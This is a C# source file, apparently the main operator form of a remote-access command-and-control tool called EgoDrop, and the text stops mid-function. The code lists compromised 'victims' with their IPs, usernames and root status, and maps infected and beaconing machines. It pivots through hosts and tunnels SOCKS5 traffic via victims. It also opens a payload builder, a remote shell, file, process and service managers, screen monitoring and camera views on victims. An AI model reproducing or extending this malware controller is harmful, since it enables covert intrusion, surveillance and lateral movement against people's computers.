using EgoDrop.Properties;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Resources;

namespace EgoDrop
{
    public partial class frmMain : Form
    {
        private string m_szVersion = "v1.0";

        public Dictionary<string, clsListener> m_dicListener = new Dictionary<string, clsListener>();
        public Dictionary<string, clsLtnProxy> m_dicLtnProxy = new Dictionary<string, clsLtnProxy>();

        private Dictionary<string, clsAgent> m_dicAgent = new Dictionary<string, clsAgent>();

        private clsSqlite m_sqlite { get; init; } //Sqlite object.
        private clsIniMgr m_iniMgr { get; init; } //IniMgr object.

        public frmMain()
        {
            InitializeComponent();

            m_sqlite = new clsSqlite("data.db");    //Sqlite object.
            m_iniMgr = new clsIniMgr("config.ini"); //IniMgr object.
        }

        /// <summary>
        /// Group type.
        /// </summary>
        private enum enGroup
        {
            All,
            Orphan,
            Offline,
        }

        /// <summary>
        /// All groups.
        /// </summary>
        private Dictionary<enGroup, TreeNode> m_dicGroupTreeNode = new Dictionary<enGroup, TreeNode>();

        #region Tools

        /// <summary>
        /// Obtain victim object from listviewitem object.
        /// </summary>
        /// <param name="item"></param>
        /// <returns>Victim object.</returns>
        private clsVictim fnGetVictimFromTag(ListViewItem item) => item.Tag == null ? null : (clsVictim)item.Tag; //Obtain victim object.

        /// <summary>
        /// Obtain victim object from listview through ID.
        /// </summary>
        /// <param name="szID">Victim's ID.</param>
        /// <returns>Victim object.</returns>
        private clsVictim fnGetVictimWithID(string szID)
        {
            ListViewItem item = listView1.FindItemWithText(szID);
            return item == null ? null : (clsVictim)item.Tag;
        }

        /// <summary>
        /// Obtain victim's ID from listviewitem.
        /// </summary>
        /// <param name="item">ListViewItem</param>
        /// <returns>Victim object.</returns>
        private string fnszGetVictimID(ListViewItem item) => item.SubItems[1].Text;

        /// <summary>
        /// Get agent object from ListViewItem's tag.
        /// </summary>
        /// <param name="item"></param>
        /// <returns></returns>
        private clsAgent fnGetAgentFromTag(ListViewItem item)
        {
            if (item.Tag == null)
                return null;

            clsVictim victim = fnGetVictimFromTag(item);
            if (victim == null)
                return null;

            string szUriName = $"{item.SubItems[4].Text}@{item.SubItems[3].Text}";

            clsAgent agent = new clsAgent(victim.m_listener, victim, item.SubItems[1].Text, szUriName, fnbIsUnixLike(item));

            return agent;
        }

        /// <summary>
        /// Get agent object with victim ID.
        /// </summary>
        /// <param name="szVictimID"></param>
        /// <returns></returns>
        private clsAgent fnGetAgentWithID(string szVictimID)
        {
            ListViewItem item = listView1.FindItemWithText(szVictimID, true, 0);
            if (item == null)
                return null;

            return fnGetAgentFromTag(item);
        }

        /// <summary>
        /// Check victim is Unix-like.
        /// </summary>
        /// <param name="item"></param>
        /// <returns></returns>
        private bool fnbIsUnixLike(ListViewItem item) => !item.SubItems[7].Text.ToLower().Contains("windows");

        /// <summary>
        /// Find interactive console with agent object.
        /// </summary>
        /// <param name="agent">Agent object.</param>
        /// <returns></returns>
        private TabPage fnFindInteractTab(clsAgent agent)
        {
            foreach (TabPage page in tabControl1.TabPages)
            {
                if (string.Equals(page.Text, agent.m_szVictimID))
                    return page;
            }

            return null;
        }

        #endregion
        #region Controls

        #region Log

        /// <summary>
        /// Write "Info" message.
        /// </summary>
        /// <param name="szMsg">Log message.</param>
        public void fnSysLogInfo(string szMsg)
        {
            richTextBox1.SelectionColor = Color.Goldenrod;
            richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] ");

            richTextBox1.SelectionColor = Color.RoyalBlue;
            richTextBox1.AppendText("[*] ");

            richTextBox1.SelectionColor = Color.White;
            richTextBox1.AppendText(szMsg);

            richTextBox1.AppendText(Environment.NewLine);

            //todo: Write log msg into database.
        }

        /// <summary>
        /// Write "OK" message.
        /// </summary>
        /// <param name="szMsg"></param>
        public void fnSysLogOK(string szMsg)
        {
            richTextBox1.SelectionColor = Color.Goldenrod;
            richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] ");

            richTextBox1.SelectionColor = Color.LimeGreen;
            richTextBox1.AppendText("[+] ");

            richTextBox1.SelectionColor = Color.White;
            richTextBox1.AppendText(szMsg);

            richTextBox1.AppendText(Environment.NewLine);

            //todo: Write log msg into database.
        }

        /// <summary>
        /// Write "Error" message.
        /// </summary>
        /// <param name="szMsg"></param>
        public void fnSysLogErr(string szMsg)
        {
            richTextBox1.SelectionColor = Color.Goldenrod;
            richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] ");

            richTextBox1.SelectionColor = Color.Red;
            richTextBox1.AppendText("[-] ");

            richTextBox1.SelectionColor = Color.White;
            richTextBox1.AppendText(szMsg);

            richTextBox1.AppendText(Environment.NewLine);

            //todo: Write log msg into database.
        }

        #endregion

        /// <summary>
        /// Refresh listener treeview.
        /// </summary>
        public void fnRefreshListenerTreeView()
        {
            treeView3.Nodes.Clear();

            TreeNode nodeListener = new TreeNode("Server"); //Pivoting server listener.
            TreeNode nodeProxy = new TreeNode("Proxy"); //Proxy server listener.

            treeView3.Nodes.AddRange(new TreeNode[]
            {
                nodeListener,
                nodeProxy,
            });

            //Add pivoting server into treeview.
            foreach (string szName in m_dicListener.Keys)
            {
                var ltn = m_dicListener[szName];
                nodeListener.Nodes.Add(new TreeNode(szName));
                nodeListener.Nodes[nodeListener.Nodes.Count - 1].Nodes.AddRange(new TreeNode[]
                {
                    new TreeNode($"Port[{ltn.m_stListener.nPort}]"), //Port.
                    new TreeNode($"Protocol[{Enum.GetName(ltn.m_stListener.protoListener)}]"), //
                    new TreeNode($"Listening[{(ltn.m_bIsListening ? "True" : "False")}]"),
                });
            }

            //Add proxy server into treeview.
            foreach (string szName in m_dicLtnProxy.Keys)
            {
                var ltn = m_dicLtnProxy[szName];
                nodeProxy.Nodes.Add(new TreeNode(szName));
                nodeProxy.Nodes[nodeProxy.Nodes.Count - 1].Nodes.AddRange(new TreeNode[]
                {
                    new TreeNode($"Port[{ltn.m_nPort}]"),
                    new TreeNode($"Protocol[{Enum.GetName(ltn.m_enProtocol)}]"),
                    new TreeNode($"Listening[{(ltn.m_bIsRunning ? "True" : "False")}]"),
                });
            }

            nodeListener.Expand();
            nodeProxy.Expand();
        }

        /// <summary>
        /// Create new interactive console tabpage.
        /// </summary>
        /// <param name="agent"></param>
        /// <param name="bAdd"></param>
        /// <returns></returns>
        TabPage fnCreateNewInteractPage(clsAgent agent)
        {
            TabPage page = new TabPage(agent.m_szUriName);
            RichTextBox rb = new RichTextBox()
            {
                BackColor = Color.Black,
                ForeColor = Color.White,
            };
            TextBox tb = new TextBox()
            {
                BackColor = Color.Black,
                ForeColor = Color.White,
            };

            page.Controls.Add(rb);
            page.Controls.Add(tb);

            //Command handler.
            tb.KeyDown += fnOnInteractConsoleKeyDown;

            rb.Dock = DockStyle.Fill;
            tb.Dock = DockStyle.Bottom;

            rb.BringToFront();

            tabControl1.TabPages.Add(page);

            return page;
        }

        /// <summary>
        /// Find interactive console page with agent object.
        /// </summary>
        /// <param name="agent">Agent object.</param>
        /// <returns>Interact page, return null if not found.</returns>
        TabPage fnFindInteractPage(clsAgent agent)
        {
            foreach (TabPage page in tabControl1.TabPages)
            {
                if (string.Equals(agent.m_szUriName, page.Text))
                {
                    return page;
                }
            }

            return null;
        }

        #endregion
        #region Events

        private void fnOnInteractConsoleKeyDown(object sender, KeyEventArgs e)
        {
            if (sender == null)
                return;

            TextBox tb = (TextBox)sender;
            if (tb == null)
                return;

            List<string> lsArgs = tb.Text.Split(' ').ToList();
            fnOnInteractConsoleCommand(lsArgs);
        }

        /// <summary>
        /// Interactive console command handler.
        /// </summary>
        /// <param name="lsArgs"></param>
        private void fnOnInteractConsoleCommand(List<string> lsArgs)
        {
            if (lsArgs == null || lsArgs.Count == 0)
                return;

            if (lsArgs[0] == "sleep")
            {

            }
        }

        /// <summary>
        /// New victim event handler.
        /// </summary>
        /// <param name="ltn"></param>
        /// <param name="vic"></param>
        public void fnOnNewVictim(clsListener ltn, clsAgent agent)
        {
            try
            {
                Invoke(new Action(() =>
                {
                    if (!m_dicAgent.ContainsKey(agent.m_szVictimID))
                        m_dicAgent[agent.m_szVictimID] = agent;
                }));
            }
            catch (Exception ex)
            {

            }
        }

        /// <summary>
        /// New received victim message event handler.
        /// </summary>
        /// <param name="ltn">Listener object.</param>
        /// <param name="victim">Victim object.</param>
        /// <param name="lsMsg">Message list.</param>
        public void fnReceivedMessage(clsListener ltn, clsVictim victim, string szSrcVictimID, List<string> lsMsg)
        {
            if (lsMsg.Count == 0)
                return;

            if (victim == null || victim.m_sktClnt == null || victim.m_sktClnt.RemoteEndPoint == null)
                return;

            Invoke(new Action(() =>
            {
                if (lsMsg[0] == "info")
                {
                    string szID = lsMsg[4];
                    if (listView1.Items.Count == 0 || listView1.FindItemWithText(szID, true, 0) == null)
                    {
                        string szIpExt = victim.m_sktClnt.RemoteEndPoint.ToString();

                        ListViewItem item = new ListViewItem(lsMsg[1]); //Screen (sudo required!).
                        item.SubItems.Add(szID);                        //Victim ID.
                        item.SubItems.Add(szIpExt);                     //External IPv4 address.
                        item.SubItems.Add(lsMsg[3]);                    //Internal IPv4 address.
                        item.SubItems.Add(lsMsg[5]);                    //Username.
                        item.SubItems.Add(lsMsg[6]);                    //uid.
                        item.SubItems.Add(lsMsg[7]);                    //root?
                        item.SubItems.Add(lsMsg[8]);                    //Operating system.
                        item.SubItems.Add(lsMsg[9]);                    //CPU usage.
                        item.SubItems.Add(string.Empty);                //Active window title (if not null or empty).

                        item.Tag = victim;

                        listView1.Items.Add(item);

                        string szUriName = $"{lsMsg[5]}@{lsMsg[3]}";

                        fnOnNewVictim(ltn, new clsAgent(ltn, victim, szID, szUriName, fnbIsUnixLike(item)));
                        fnSysLogOK($"New victim[{szID}]"); //Write new log message.
                    }
                    else
                    {
                        ListViewItem item = listView1.FindItemWithText(szID);
                        if (item == null)
                            return;

                        item.SubItems[8].Text = lsMsg[9];
                    }
                }
                else if (lsMsg[0] == "server")
                {
                    if (lsMsg[1] == "start")
                    {
                        int nCode = int.Parse(lsMsg[2]);
                        string szMsg = lsMsg[3];

                        if (nCode == 1)
                        {
                            NetworkNode node = networkView1.FindNodeWithID(szSrcVictimID);
                            if (node == null)
                            {
                                clsTools.fnShowErrMsgbox("NetworkNode is null.");
                                return;
                            }

                            //Change machine status.
                            switch (node.MachineStatus)
                            {
                                #region Linux

                                case NetworkView.enMachineStatus.Linux_Infected:
                                    networkView1.fnSetMachineStatus(node, NetworkView.enMachineStatus.Linux_Beacon);
                                    break;
                                case NetworkView.enMachineStatus.Linux_Super:
                                    networkView1.fnSetMachineStatus(node, NetworkView.enMachineStatus.Linux_Beacon);
                                    break;

                                #endregion
                                #region Windows

                                case NetworkView.enMachineStatus.Windows_Infected:
                                    networkView1.fnSetMachineStatus(node, NetworkView.enMachineStatus.Windows_Beacon);
                                    break;
                                case NetworkView.enMachineStatus.Windows_Super:
                                    networkView1.fnSetMachineStatus(node, NetworkView.enMachineStatus.Windows_Beacon);
                                    break;

                                #endregion
                                #region MacOS

                                case NetworkView.enMachineStatus.Mac_Infected:

                                    break;
                                case NetworkView.enMachineStatus.Mac_Super:

                                    break;

                                #endregion
                                #region Webcam

                                case NetworkView.enMachineStatus.Webcam_Infected:

                                    break;
                                case NetworkView.enMachineStatus.Webcam_Super:

                                    break;

                                    #endregion
                            }
                        }
                        else
                        {
                            clsTools.fnShowErrMsgbox(szMsg, "Pivoting");
                        }
                    }
                    else if (lsMsg[1] == "stop")
                    {
                        int nCode = int.Parse(lsMsg[2]);
                        string szMsg = lsMsg[3];

                        if (nCode == 1)
                        {
                            NetworkNode? node = networkView1.FindNodeWithID(szSrcVictimID);
                            if (node == null)
                                return;

                            ListViewItem? item = listView1.FindItemWithText(szSrcVictimID, true, 0);

                            if (item == null)
                                return;

                            bool bRoot = string.Equals(item.SubItems[6].Text, "1");

                            switch (node.MachineStatus)
                            {
                                case NetworkView.enMachineStatus.Linux_Beacon:
                                    networkView1.fnSetMachineStatus(node, bRoot ? NetworkView.enMachineStatus.Linux_Super : NetworkView.enMachineStatus.Linux_Infected);
                                    break;
                                case NetworkView.enMachineStatus.Windows_Beacon:
                                    networkView1.fnSetMachineStatus(node, bRoot ? NetworkView.enMachineStatus.Windows_Super : NetworkView.enMachineStatus.Windows_Infected);
                                    break;
                            }
                        }
                        else
                        {
                            clsTools.fnShowErrMsgbox(szMsg, "Pivoting");
                        }
                    }
                }
                else if (lsMsg[0] == "proxy")
                {
                    if (lsMsg[1] == "socks5")
                    {
                        if (lsMsg[2] == "open")
                        {
                            int nCode = int.Parse(lsMsg[3]);
                            int nStreamId = int.Parse(lsMsg[4]);

                            if (nCode == 1)
                            {
                                fnOnProxyOpened(nStreamId, victim, szSrcVictimID);
                            }
                            else
                            {
                                fnOnProxyClosed(nStreamId, victim, szSrcVictimID);
                            }
                        }
                        else if (lsMsg[2] == "close")
                        {
                            int nStreamId = int.Parse(lsMsg[3]);

                            fnOnProxyClosed(nStreamId, victim, szSrcVictimID);
                        }
                        else if (lsMsg[2] == "data")
                        {
                            int nStreamId = int.Parse(lsMsg[3]);
                            string szB64 = lsMsg[4];
                            byte[] abBuffer = Convert.FromBase64String(szB64);

                            fnOnProxyRecvVictimData(nStreamId, victim, szSrcVictimID, abBuffer);
                        }
                    }
                }
                else if (lsMsg[0] == "plugin")
                {
                    if (lsMsg[1] == "output")
                    {
                        if (lsMsg[2] == "info") //[*]
                        {

                        }
                        else if (lsMsg[2] == "ok") //[+]
                        {

                        }
                        else if (lsMsg[2] == "err") //[-]
                        {

                        }
                    }
                }
                else if (lsMsg[0] == "disconnect")
                {
                    string szVictimID = lsMsg[1];
                    fnOnVictimDisconnected(ltn, victim, szVictimID);
                }
            }));
        }

        /// <summary>
        /// Victim disconnected event handler.
        /// </summary>
        /// <param name="ltn">Listener object.</param>
        /// <param name="vic">Victim object.</param>
        public void fnOnVictimDisconnected(clsListener ltn, clsVictim vic, string szVictimID)
        {
            TreeNode? fnFindNode(string szID, TreeNode? nodeParent = null)
            {
                foreach (TreeNode node in nodeParent == null ? treeView2.Nodes : nodeParent.Nodes)
                {
                    if (string.Equals(node.Text, szID))
                    {
                        return node;
                    }
                    else
                    {
                        return fnFindNode(szID, node);
                    }
                }

                return nodeParent;
            }

            if (vic == null || vic.m_sktClnt == null || vic.m_sktClnt.RemoteEndPoint == null)
                return;

            Invoke(new Action(() =>
            {
                //Remove from listview.
                foreach (ListViewItem item in listView1.Items)
                {
                    if (clsTools.fnbSameVictim(vic, fnGetVictimFromTag(item)) && string.Equals(item.SubItems[1].Text, szVictimID))
                    {
                        listView1.Items.Remove(item);

                        if (!m_dicAgent.ContainsKey(szVictimID))
                            m_dicAgent.Remove(szVictimID);

                        fnSysLogInfo($"Offline[{szVictimID}]");
                    }
                }

                //Remove from treeview.
                TreeNode tNode = fnFindNode(szVictimID);
                if (tNode == null)
                    return;

                treeView2.Nodes.Remove(tNode);

                //Remove from networkview.
                NetworkNode? node = networkView1.FindNodeWithID(szVictimID);
                if (node == null)
                    return;

                networkView1.RemoveNode(node);

                NetworkNode? firewallNode = networkView1.FindNodeWithName($"Firewall@{vic.m_sktClnt.RemoteEndPoint}");
                if (firewallNode == null)
                    return;

                if (firewallNode.ChildNodes.Count == 0)
                    networkView1.RemoveNode(firewallNode);

                vic.fnDeleteVictimChain(szVictimID);

                //Check proxy
                var ltns = m_dicLtnProxy.Keys.Select(x => m_dicLtnProxy[x]).Where(x => string.Equals(x.m_szVictimID, szVictimID)).ToList();
                if (ltns.Count > 0)
                {
                    DialogResult dr = MessageBox.Show(

                        $"Detected {ltns.Count} {(ltns.Count == 1 ? "proxy" : "proxies")} using the offlined Victim[{szVictimID}] as the endpoint, " +
                        $"{(ltns.Count == 1 ? "this" : "these")} {(ltns.Count == 1 ? "is" : "are")} no longer available, " +
                        $"do you want to remove {(ltns.Count == 1 ? "it" : "them")} ?",

                        "Warning",

                        MessageBoxButtons.YesNo,
                        MessageBoxIcon.Warning,
                        MessageBoxDefaultButton.Button1 //No
                    );

                    if (dr == DialogResult.Yes)
                    {
                        foreach (var ltn in ltns)
                        {
                            ltn.fnStop();
                            m_dicLtnProxy.Remove(ltn.m_szName);

                            fnSysLogInfo($"Removed proxy[{ltn.m_szName}]");
                        }
                    }
                    else
                    {
                        foreach (var ltn in ltns)
                        {
                            ltn.fnStop();

                            fnSysLogInfo($"Stopped proxy[{ltn.m_szName}]");
                        }
                    }
                }

                fnSysLogInfo($"Offline[{szVictimID}]");
                fnRefreshListenerTreeView();
            }));
        }

        /// <summary>
        /// Add agent chain to NetworkView.
        /// </summary>
        /// <param name="listener"></param>
        /// <param name="lsVictim"></param>
        /// <param name="szOS"></param>
        /// <param name="szUsername"></param>
        /// <param name="bRoot"></param>
        /// <param name="szIPv4"></param>
        /// <param name="enProtocol"></param>
        public void fnOnAddChain(clsListener listener, clsVictim victim, List<string> lsVictim, string szOS, string szUsername, bool bRoot, string szIPv4, NetworkView.enConnectionType enProtocol)
        {
            NetworkView.enMachineStatus fnGetStatusFromOS(string szOS)
            {
                szOS = szOS.ToLower();

                string[] asWindows = new string[]
                {
                    "windows",
                };
                string[] asLinux = new string[]
                {
                    "linux",
                    "ubuntu",
                    "freebsd",
                    "centos",
                    "debian",
                };

                foreach (string s in asWindows)
                {
                    if (szOS.Contains(s))
                    {
                        return NetworkView.enMachineStatus.Windows_Infected;
                    }
                }
                foreach (string s in asLinux)
                {
                    if (szOS.Contains(s))
                    {
                        return NetworkView.enMachineStatus.Linux_Infected;
                    }
                }

                return NetworkView.enMachineStatus.Unknown;
            }
            void fnAddTreeView(List<string> lsVictim, NetworkView.enMachineStatus status, TreeNode nodeParent = null)
            {
                TreeNode node = null;
                foreach (TreeNode n in nodeParent == null ? treeView2.Nodes : nodeParent.Nodes)
                {
                    if (string.Equals(n.Text, lsVictim.First()))
                    {
                        node = n;
                        break;
                    }
                }

                if (node == null)
                {
                    node = new TreeNode(lsVictim.First());
                    node.ImageKey = Enum.GetName(status);

                    if (nodeParent == null)
                    {
                        treeView2.Nodes.Add(node);
                    }
                    else
                    {
                        nodeParent.Nodes.Add(node);
                        nodeParent.Expand();

                        nodeParent.EnsureVisible();
                    }
                }

                if (lsVictim.Count == 1)
                    return;

                fnAddTreeView(lsVictim[1..], status, node);
            }

            Invoke(new Action(() =>
            {
                try
                {
                    for (int i = 0; i < lsVictim.Count; i++)
                    {
                        string szVictim = lsVictim[i];

                        if (networkView1.FindNodeWithID(szVictim) != null)
                        {
                            continue;
                        }

                        var status = fnGetStatusFromOS(szOS);
                        if (bRoot)
                        {
                            if (status == NetworkView.enMachineStatus.Linux_Infected)
                                status = NetworkView.enMachineStatus.Linux_Super;
                            else if (status == NetworkView.enMachineStatus.Windows_Infected)
                                status = NetworkView.enMachineStatus.Windows_Super;
                        }

                        string szUriName = $"{szUsername}@{szIPv4}";
                        var n1 = networkView1.AddNode($"{szVictim}", szUriName, status);
                        n1.Agent = m_dicAgent[szVictim];

                        victim.fnAddVictimChain(szVictim, lsVictim[..(i + 1)]);

                        fnAddTreeView(lsVictim, status);

                        if (i == 0)
                        {
                            string szName = $"Firewall@{victim.m_sktClnt.RemoteEndPoint.ToString()}";
                            if (networkView1.FindNodeWithName(szName) == null)
                            {
                                var fireWall = networkView1.AddNode(szName, szName, NetworkView.enMachineStatus.Firewall);
                                networkView1.AddConnection(fireWall, n1, true, enProtocol);
                                //networkView1.MoveNodeToLeft(fireWall);
                                networkView1.BringGraphIntoView();
                            }

                            continue;
                        }

                        var nodeParent = networkView1.FindNodeWithID(lsVictim[i - 1]);
                        networkView1.AddConnection(nodeParent, n1, true, enProtocol);
                    }
                }
                catch (Exception ex)
                {
                    clsTools.fnShowErrMsgbox(ex.Message);
                }
            }));
        }

        /// <summary>
        /// Proxy server received endpoint's data.
        /// </summary>
        /// <param name="nStreamId"></param>
        /// <param name="victim"></param>
        /// <param name="szVictimID"></param>
        /// <param name="abData"></param>
        public void fnOnProxyRecvVictimData(int nStreamId, clsVictim victim, string szVictimID, byte[] abData)
        {
            foreach (string szName in m_dicLtnProxy.Keys)
            {
                try
                {
                    var ltnProxy = m_dicLtnProxy[szName];
                    ltnProxy.fnOnRecvVictimData(ltnProxy, nStreamId, victim, szVictimID, abData);

                    switch (ltnProxy.m_enProtocol)
                    {
                        case clsSqlite.enProxyProtocol.Socks5:
                            ((clsLtnSocks5)ltnProxy).fnOnClientData(nStreamId, abData);
                            break;
                    }
                }
                catch
                {

                }
            }
        }

        /// <summary>
        /// Open the tunnel between proxy server and victim.
        /// </summary>
        /// <param name="nStreamId"></param>
        /// <param name="victim"></param>
        /// <param name="szVictimID"></param>
        public void fnOnProxyOpened(int nStreamId, clsVictim victim, string szVictimID)
        {
            foreach (string szName in m_dicLtnProxy.Keys)
            {
                var ltnProxy = m_dicLtnProxy[szName];

                switch (ltnProxy.m_enProtocol)
                {
                    case clsSqlite.enProxyProtocol.Socks5:
                        ((clsLtnSocks5)ltnProxy).fnOnProxyOpened(nStreamId);
                        break;
                }
            }
        }

        /// <summary>
        /// Close the tunnel between proxy server and victim.
        /// </summary>
        /// <param name="nStreamId"></param>
        /// <param name="victim"></param>
        /// <param name="szVictimID"></param>
        public void fnOnProxyClosed(int nStreamId, clsVictim victim, string szVictimID)
        {
            foreach (string szName in m_dicLtnProxy.Keys)
            {
                var ltnProxy = m_dicLtnProxy[szName];

                switch (ltnProxy.m_enProtocol)
                {
                    case clsSqlite.enProxyProtocol.Socks5:
                        ((clsLtnSocks5)ltnProxy).fnOnProxyClose(nStreamId);
                        break;
                }
            }
        }

        #endregion

        private void fnSetup()
        {
            //Load groups
            m_dicGroupTreeNode.Add(enGroup.All, treeView1.Nodes[0]);

            List<string> lsGroup = m_sqlite.fnlsGetGroups();
            foreach (string szName in lsGroup)
            {
                TreeNode node = new TreeNode(szName);
                treeView1.Nodes.Add(node);
            }

            networkView1.imageList = imageList1;

            ImageList smallImageList = new ImageList();
            foreach (string szKey in imageList1.Images.Keys)
                smallImageList.Images.Add(szKey, imageList1.Images[szKey]);

            smallImageList.ImageSize = new Size(30, 30);

            treeView2.ImageList = smallImageList;

            networkView1.Zoom = 1.0f;

            toolStripButton1.Checked = true;
            toolStripButton2.Checked = false;

            timer1.Start();
        }

        private void frmMain_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        //Listener
        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            frmListener f = new frmListener(this, m_sqlite, m_dicListener);

            f.ShowDialog();

            fnRefreshListenerTreeView();
        }

        //Builder
        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            frmBuilder f = new frmBuilder(this, m_sqlite, m_iniMgr);
            f.Show();
        }

        //Setting
        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            frmSetting f = new frmSetting(m_iniMgr);

            f.ShowDialog();
        }

        //About
        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            new frmAbout().Show();
        }

        //Info
        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                string szVictimID = fnszGetVictimID(item);
                frmInfoSpyder f = new frmInfoSpyder(szVictimID, fnGetVictimFromTag(item));
                f.Show();
            }
        }

        //File
        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                clsAgent agent = fnGetAgentFromTag(item);
                frmFileMgr f = clsTools.fnFindForm<frmFileMgr>(agent);
                if (f == null)
                {
                    f = new frmFileMgr(agent);
                    f.Show();
                }
                else
                {
                    f.BringToFront();
                }
            }
        }

        //Process
        private void toolStripMenuItem7_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                clsAgent agent = fnGetAgentFromTag(item);

                frmProcMgr f = clsTools.fnFindForm<frmProcMgr>(agent);
                if (f == null)
                {
                    f = new frmProcMgr(agent);
                    f.Show();
                }
                else
                {
                    f.BringToFront();
                }
            }
        }

        //Service
        private void toolStripMenuItem8_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                clsAgent agent = fnGetAgentFromTag(item);

                frmSrvMgr f = clsTools.fnFindForm<frmSrvMgr>(agent);
                if (f == null)
                {
                    f = new frmSrvMgr(agent);
                    f.Show();
                }
                else
                {
                    f.BringToFront();
                }
            }
        }

        //Monitor
        private void toolStripMenuItem9_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                frmMonitor f = new frmMonitor(fnGetVictimFromTag(item));

                f.Show();
            }
        }

        //Camera
        private void toolStripMenuItem10_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                frmCamera f = new frmCamera();

                f.Show();
            }
        }

        private void toolStripMenuItem11_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                clsAgent agent = fnGetAgentFromTag(item);
                frmShell f = clsTools.fnFindForm<frmShell>(agent);
                if (f == null)
                {
                    f = new frmShell(agent);
                    f.Show();
                }
                else
                {
                    f.BringToFront();
                }
            }
        }

        private void toolStripMenuItem12_Click(object sender, EventArgs e)
        {

        }

        private void toolStripMenuItem13_Click(object sender, EventArgs e)
        {
            NetworkNode node = networkView1.SelectedNode;
            if (node == null)
                return;

            clsAgent agent = node.Agent;

            frmFileMgr f = clsTools.fnFindForm<frmFileMgr>(agent);
            if (f == null)
            {
                f = new frmFileMgr(agent);
                f.Show();
            }
            else
            {
                f.BringToFront();
            }
        }

        private void toolStripMenuItem14_Click(object sender, EventArgs e)
        {
            frmGroup f = new frmGroup(this, m_sqlite);
            f.ShowDialog();

            var ls = m_sqlite.fnlsGetGroups();
        }

        private void treeView2_AfterSelect(object sender, TreeViewEventArgs e)
        {
            treeView2.SelectedImageKey = treeView2.SelectedNode.ImageKey;
        }

        private void networkView1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                NetworkNode node = networkView1.SelectedNode;
                if (node == null)
                    return;

                if (node.bIsWindows)
                    networkView1.ContextMenuStrip = topoWinContextMenu;
                else if (node.bIsLinux)
                    networkView1.ContextMenuStrip = topoLinuxContextMenu;
            }
        }

        private void listView1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                if (listView1.SelectedItems.Count == 0)
                    return;

                ListViewItem item = listView1.SelectedItems.Cast<ListViewItem>().First();

                if (!fnbIsUnixLike(item))
                    listView1.ContextMenuStrip = tWinContextMenu;
                else
                    listView1.ContextMenuStrip = tLinuxContextMenu;
            }
        }

        private void toolStripMenuItem17_Click(object sender, EventArgs e)
        {

        }

        private void toolStripMenuItem18_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                clsAgent agent = fnGetAgentFromTag(item);

                frmFileMgr f = clsTools.fnFindForm<frmFileMgr>(agent);
                if (f == null)
                {
                    f = new frmFileMgr(agent);
                    f.Show();
                }
                else
                {
                    f.BringToFront();
                }
            }
        }

        private void toolStripMenuItem16_Click(object sender, EventArgs e)
        {
            NetworkNode node = networkView1.SelectedNode;
            if (node == null)
                return;

            clsAgent agent = node.Agent;

            frmFileMgr f = clsTools.fnFindForm<frmFileMgr>(agent);
            if (f == null)
            {
                f = new frmFileMgr(agent);
                f.Show();
            }
            else
            {
                f.BringToFront();
            }
        }

        //Tree
        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            toolStripButton1.Checked = true;
            toolStripButton2.Checked = false;

            networkView1.NetworkViewTopoLogy = NetworkView.enTopologyLayout.Tree;
        }

        //Pyramid
        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            toolStripButton1.Checked = false;
            toolStripButton2.Checked = true;

            networkView1.NetworkViewTopoLogy = NetworkView.enTopologyLayout.Pyramid;
        }

        private void toolStripMenuItem19_Click(object sender, EventArgs e)
        {
            NetworkNode node = networkView1.SelectedNode;
            if (node == null)
                return;

            frmShell f = clsTools.fnFindForm<frmShell>(node.Agent);
            if (f == null)
            {
                f = new frmShell(node.Agent);
                f.Show();
            }
            else
            {
                f.BringToFront();
            }
        }

        private void toolStripMenuItem20_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                clsAgent agent = fnGetAgentFromTag(item);
                frmShell f = clsTools.fnFindForm<frmShell>(agent);
                if (f == null)
                {
                    f = new frmShell(agent);
                    f.Show();
                }
                else
                {
                    f.BringToFront();
                }
            }
        }

        private void toolStripMenuItem25_Click(object sender, EventArgs e)
        {
            NetworkNode node = networkView1.SelectedNode;
            if (node == null)
                return;

            frmShell f = clsTools.fnFindForm<frmShell>(node.Agent);
            if (f == null)
            {
                f = new frmShell(node.Agent);
                f.Show();
            }
            else
            {
                f.BringToFront();
            }
        }

        private void toolStripMenuItem26_Click(object sender, EventArgs e)
        {
            frmProxy f = new frmProxy(this, m_sqlite);
            f.Show();
        }

        private void toolStripMenuItem27_Click(object sender, EventArgs e)
        {
            NetworkNode node = networkView1.SelectedNode;
            if (node == null)
                return;

            string szID = node.szVictimID;
            if (string.IsNullOrEmpty(szID))
                return;

            ListViewItem item = listView1.FindItemWithText(szID, true, 0);
            if (item == null)
                return;

            clsVictim victim = fnGetVictimFromTag(item);

            string szIPv4 = node.szDisplayName.Split('@').Last();

            frmServerProxy f = new frmServerProxy(szID, victim, m_dicListener, szIPv4);
            f.Show();
        }

        private void toolStripMenuItem28_Click(object sender, EventArgs e)
        {
            NetworkNode node = networkView1.SelectedNode;
            if (node == null)
                return;

            string szID = node.szVictimID;
            if (string.IsNullOrEmpty(szID))
                return;

            ListViewItem item = listView1.FindItemWithText(szID, true, 0);
            if (item == null)
                return;

            clsVictim victim = fnGetVictimFromTag(item);

